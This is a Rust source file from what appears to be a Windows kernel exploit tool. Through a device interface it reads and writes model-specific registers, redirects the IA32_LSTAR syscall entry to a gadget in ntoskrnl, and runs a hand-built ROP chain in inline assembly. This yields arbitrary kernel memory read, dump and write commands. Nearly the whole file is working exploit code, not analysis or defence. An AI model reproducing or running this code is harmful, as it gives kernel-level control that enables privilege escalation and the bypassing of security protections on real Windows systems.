use anyhow::{bail, Context, Result};

use windows_sys::Win32::System::Threading::{GetCurrentThread, SetThreadAffinityMask, SetThreadPriority};

use crate::device::{msr_read, msr_write, Device, MSR_FMASK, MSR_LSTAR};
use crate::gadgets::scan_gadgets_in_pe;
use crate::kernel_rw::KernelRW;
use crate::utils::{find_mod, get_kernel_modules, ntoskrnl_disk_path, KernelMod};

const THREAD_PRIORITY_TIME_CRITICAL: i32 = 15;
const THREAD_PRIORITY_NORMAL: i32 = 0;

pub fn open_krw(dev: &Device) -> Result<(KernelRW<'_>, Vec<u8>, KernelMod)> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let krw = KernelRW::setup(dev, &pe, nt.va)?;
    println!("[+] Let's have some fun ))");
    { use std::io::Write; let _ = std::io::stdout().flush(); }
    Ok((krw, pe, nt))
}

pub fn cmd_kread(dev: &Device, target_va: u64) -> Result<()> {
    let (krw, _, _) = open_krw(dev)?;
    let val = krw.kread(target_va)?;
    println!("[+] kread [0x{:016X}] = 0x{:016X}  ({})", target_va, val, val);
    Ok(())
}

pub fn cmd_kdump(dev: &Device, target_va: u64, count: u64) -> Result<()> {
    let (krw, _, _) = open_krw(dev)?;
    println!("[+] dumping {} qwords from 0x{:016X}:", count, target_va);
    for i in 0..count {
        let addr = target_va + i * 8;
        match krw.kread(addr) {
            Ok(v)  => println!("  0x{:016X}: 0x{:016X}", addr, v),
            Err(e) => println!("  0x{:016X}: ERROR {}", addr, e),
        }
    }
    Ok(())
}

#[inline(never)]
#[allow(named_asm_labels)]
pub fn cmd_kwrite(dev: &Device, target_va: u64, write_value: u64) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);

    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;

    let gadgets = scan_gadgets_in_pe(&pe, nt.va)?;
    if !gadgets.all_found() {
        bail!("missing ROP gadgets in ntoskrnl.exe");
    }
    println!("[+] all ROP gadgets found");

    unsafe {
        let t = GetCurrentThread();
        SetThreadAffinityMask(t, 1);
        SetThreadPriority(t, THREAD_PRIORITY_TIME_CRITICAL);
    }
    println!("[*] thread pinned to core 0");

    let lstar_orig = msr_read(dev, MSR_LSTAR)?;
    println!("[+] IA32_LSTAR=0x{:016X}", lstar_orig);

    let fmask_orig = msr_read(dev, MSR_FMASK)?;
    let fmask_new = fmask_orig & !(1u64 << 18);
    if fmask_new != fmask_orig {
        msr_write(dev, MSR_FMASK, fmask_new)?;
        println!("[*] FMASK 0x{:016X} -> 0x{:016X}", fmask_orig, fmask_new);
    }

    let lstar_lo = lstar_orig & 0xFFFF_FFFF;
    let lstar_hi = lstar_orig >> 32;

    let mut rop = vec![0u64; 13];
    rop[0]  = gadgets.pop_rdx.unwrap();
    rop[1]  = lstar_hi;
    rop[2]  = gadgets.pop_rax.unwrap();
    rop[3]  = lstar_lo;
    rop[4]  = gadgets.pop_rcx.unwrap();
    rop[5]  = MSR_LSTAR as u64;
    rop[6]  = gadgets.wrmsr_ret.unwrap();
    rop[7]  = gadgets.iretq.unwrap();
    rop[9]  = 0x33;
    rop[12] = 0x2b;

    let rop_ptr = rop.as_mut_ptr() as u64;

    let write_gadget = gadgets.write_mem.unwrap();
    println!("[*] writing 0x{:016X} -> [0x{:016X}]  LSTAR=0x{:016X}", write_value, target_va, write_gadget);
    { use std::io::Write; let _ = std::io::stdout().flush(); }

    msr_write(dev, MSR_LSTAR, write_gadget)?;

    unsafe {
        std::arch::asm!(
            "leaq .L_cmd_kwrite_ret(%rip), %r10",
            "movq %r10, 64({rop})",
            "pushfq",
            "popq %r10",
            "movq %r10, 80({rop})",
            "movq %rsp, 88({rop})",
            "pushfq",
            "popq %r10",
            "orq $0x40000, %r10",
            "pushq %r10",
            "popfq",
            "movq {val}, %rax",
            "movq {tgt}, %rdx",
            "movq {rop}, %rsp",
            "syscall",
            ".L_cmd_kwrite_ret:",
            rop = in(reg) rop_ptr,
            val = in(reg) write_value,
            tgt = in(reg) target_va,
            out("rax") _,
            out("rcx") _,
            out("rdx") _,
            out("r10") _,
            out("r11") _,
            options(att_syntax),
        );
    }

    println!("[+] returned cleanly from ROP chain");

    let lstar_check = msr_read(dev, MSR_LSTAR)?;
    if lstar_check == lstar_orig {
        println!("[+] LSTAR verified: 0x{:016X}", lstar_check);
    } else {
        println!("[!] LSTAR MISMATCH: got 0x{:016X}, expected 0x{:016X}", lstar_check, lstar_orig);
    }

    if fmask_new != fmask_orig {
        msr_write(dev, MSR_FMASK, fmask_orig)?;
        println!("[*] FMASK restored");
    }

    unsafe {
        let t = GetCurrentThread();
        SetThreadPriority(t, THREAD_PRIORITY_NORMAL);
        SetThreadAffinityMask(t, !0usize);
    }

    Ok(())
}
